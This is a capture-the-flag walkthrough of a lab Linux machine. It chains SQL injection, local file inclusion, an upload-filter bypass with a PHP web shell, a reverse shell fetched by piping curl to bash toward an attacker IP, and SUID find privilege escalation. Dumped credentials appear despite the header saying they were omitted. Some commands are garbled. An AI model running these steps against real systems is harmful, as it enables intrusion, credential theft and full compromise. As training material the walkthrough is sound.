## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Use your red teaming knowledge to pwn a Linux machine.
This challenge is an initial test to evaluate your capabilities in red teaming skills. Start the VM by clicking the `Start Machine` button at the top right of the task. You will find all the necessary tools to complete the challenge, like Nmap, sqlmap, wordlists, PHP shell, and many more in the AttackBox.  

_Exposing unnecessary services in a machine can be dangerous. Can you capture the flags and pwn the machine_?
```

## IP-Address
```IP-Address
10.10.79.15
```

## RustScan
```bash
$ rustscan -a 10.10.79.15 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 60
22/tcp   open  ssh     syn-ack ttl 60
53/tcp   open  domain  syn-ack ttl 60
1337/tcp open  waste   syn-ack ttl 60
1883/tcp open  mqtt    syn-ack ttl 60
```

## NMAP
```bash
$ nmap -p 21,53, 1337, 1883 --script banner,http-headers,http-methods -sV 10.10.79.15
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 14:20 EDT
Failed to resolve "1337,".
Nmap scan report for 10.10.31.111
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   NULL: 
|_    220 Welcome to the Expose Web Challenge.
|_banner: 220 Welcome to the Expose Web Challenge.
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=7/28%Time=6887BF71%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"220\x20Welcome\x20to\x20the\x20Expose\x20Web\x20Challenge\.\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (1 host up) scanned in 33.03 seconds
```

## FTP Scan
```bash
$ nmap -p 21 --script=ftp-anon 10.10.79.15

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 14:40 EDT
Nmap scan report for 10.10.31.111
Host is up (0.19s latency).

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds
```

## FTP Login
```bash
 ftp 10.10.79.15
Connected to 10.10.31.111.
220 Welcome to the Expose Web Challenge.
Name (10.10.31.111:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17335|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||58214|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 11  2023 .
drwxr-xr-x    2 0        121          4096 Jun 11  2023 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||21961|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 11  2023 .
drwxr-xr-x    2 0        121          4096 Jun 11  2023 ..
226 Directory send OK.
ftp> pwd
Remote directory: /
```

IT leads to nothing, so lets focus on other ports

First we navigate to  http://10.10.79.15:1337/ and Got The messaage Exposed so after that we run
## Gobuster
#Gobuster_big
```bash
$ gobuster dir -u http://10.10.79.15:1337/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 4 -x php,txt,bake
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.bake       (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 317] [--> /admin                (Status: 301) [Size: 317] [--> http://10.10.36.33:1337/admin/]
/admin_101            (Status: 301) [Size: 321] [--> http://10.10.36.33:1337/admin_101/]
/index.php            (Status: 200) [Size: 91]
/javascript           (Status: 301) [Size: 322] [--> http://10.10.36.33:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 322] [--> http://10.10.36.33:1337/phpmyadmin/]
```

We Got this http://10.10.79.15:1337/admin/ but soon realised when checked his source that its a fake login page so we try try to find another 
and we got this http://10.10.79.15:1337/phpmyadmin/ which is a real login page 
but later we found another page which is /admin_101/ and thats actually an  login page with predefined email address which is `hacker@root.thm` then we collect the burp suite request and save it in a file 
```burp-request
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.36.33:1337
Content-Length: 41
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://10.10.36.33:1337
Referer: http://10.10.36.33:1337/admin_101/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jpnlmjde6m3265ak1vsrp9opcv
Connection: keep-alive
email=hacker%40root.thm&password=[password omitted]
```

after that we save it in as file known as `req.txt`
and use sqlmap with level3 --dbs
```bash 
sqlmap -r req.txt --dbs level-3 risk-3 -dump
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[08:55:18] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[08:55:22] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[08:55:24] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[08:55:24] [INFO] starting 4 processes 
[08:55:29] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'        
Database: expose                                                                                   
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

[08:55:41] [INFO] table 'expose.config' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.36.33/dump/expose/config.csv'                                                                   
[08:55:41] [INFO] fetching columns for table 'user' in database 'expose'
[08:55:42] [INFO] retrieved: 'id'
[08:55:42] [INFO] retrieved: 'int'
[08:55:43] [INFO] retrieved: 'email'
[08:55:43] [INFO] retrieved: 'varchar(512)'
[08:55:43] [INFO] retrieved: 'password'
[08:55:44] [INFO] retrieved: 'varchar(512)'
[08:55:44] [INFO] retrieved: 'created'
[08:55:44] [INFO] retrieved: 'timestamp'
[08:55:44] [INFO] fetching entries for table 'user' in database 'expose'
[08:55:45] [INFO] retrieved: '2023-02-21 09:05:46'
[08:55:45] [INFO] retrieved: 'hacker@root.thm'
[08:55:45] [INFO] retrieved: '1'
[08:55:45] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+
[08:55:45] [INFO] table 'expose.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.36.33/dump/expose/user.csv'           
[08:55:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.36.33'                                
[*] ending @ 08:55:45 /2025-07-30/

```

We Got credentials by which we are able to login inside at http://expose:1337/admin_101/\
and thats leads us to http://10.10.36.33:1337/admin_101/chat.php 
```Credentials
| 1  | hacker@root.thm | VeryDifficultPassword!!#@#@!#!@#1231|
```
But with this we found nothing so we move on to other things we found with the credentials like files which is present 
so we surf on the browser with the files and got something 
```Files
/file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       
/upload-cv00101011/index.php | ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
```
These were the files with the password itself how we confirm that ? like on crack-station this `md5` is actually `easytohack` so we first surf on the browser for the  `/file1010111/index.php` which us to open the file and were get the hint as `Parameter Fuzzing is also important :) or Can you hide DOM elements?`
also when we check the source file we get to know that there was an hidden hint which is 
`Hint: Try file or view as GET parameters?<`
so we try LFI on the browser 
`http://10.10.207.63:1337/file1010111/index.php?file=../../../../etc/passwd`
which gives us what we want
```/etc/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:
ZeamKish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

Where we found a user named 
`ZeamKish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp `
where in second file his named also start with z which help us to access the other file also we can start hydra or dictionary attack on it 
but first lets explore the file which is 
http://10.10.207.63:1337/upload-cv00101011/index.php where password is zeamkish
and a page is pop up where we can upload file and we can get reverse-shell using it 
so lets get it first 
so we first create an php reverse-shell code from github and then change the extension from php to png cause it requires the png format we get to know from the script in the source code 
```javascript 
<script>
function validate(){
 var fileInput = document.getElementById('file');
  var file = fileInput.files[0]; 
  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
	  return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
	  return false;
    }
  }
}
</script>
```
then we change the extension
```bash
mv reversehll.php payload.png
```
and upload it on the website which is upload successfully 
and we got the message `File uploaded successfully! Maybe look in source code to see the path`
also with the hint 
`in /upload_thm_1001 folder` and we got the file path for the uploads file
`http://10.10.207.63:1337/upload_thm_1001/payload.png` 
but it didnt work well so we used old methods first we create a file which include
```bash
echo -e "<?php system(\$_GET['cmd']); ?>" > shell.php.png
```
and with burp we edit the req. by change the file name by `shell.php`
and used browser to check it its works or not 
`http://10.10.207.63:1337/upload-cv00101011/upload_thm_1001/shell12.php?cmd=id`
with this 
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` on browser
so we try to inject multiple reverse-shell but didnt work directly so we used python3 http server for this 
first we create a file which is #python_reverseshell
```bash
$nano reverse.sh
#!/bin/bash
bash -i >& /dev/tcp/10.17.36.74/4444 0>&1
$chmod +x reverse.sh
python3 -m http.server 8000
```
then on browser we sent request
`http://10.10.207.63:1337/upload-cv00101011/upload_thm_1001/shell12.php?cmd=curl+http://10.17.36.74:8000/reverse.sh|bash`
and we got the reverseshell make sure to run the nc parrrallel
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.207.63] 53360
bash: cannot set terminal process group (786): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-207-63:/var/www/html/upload-cv00101011/upload_thm_1001$ 
```
then we found out the credentials of zeamkish
```bash
cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
```
and use SSH to get into the system
and got the user flag 
```bash
zeamkish@ip-10-10-207-63:~$ ls
flag.txt  ssh_creds.txt
zeamkish@ip-10-10-207-63:~$ cat flag.txt
[flag omitted]
```
and then used find command to get the sudo files
```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/nano
/usr/bin/su
/usr/bin/fusermount
/usr/bin/find
/usr/bin/at
/usr/bin/mount
```

the  we get to know that we have nano 
so we get access to shadow using nano and also we found find command suid so we try to get sudo using find first 
```bash
zeamkish@ip-10-10-207-63:/$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
# cat /root/root.txt
cat: /root/root.txt: No such file or directory
# cd /root
# ls
flag.txt  snap
# cat fl
cat: fl: No such file or directory
# cat flag.txt
[flag omitted]
```
Got the flag
```flag
[flag omitted]
```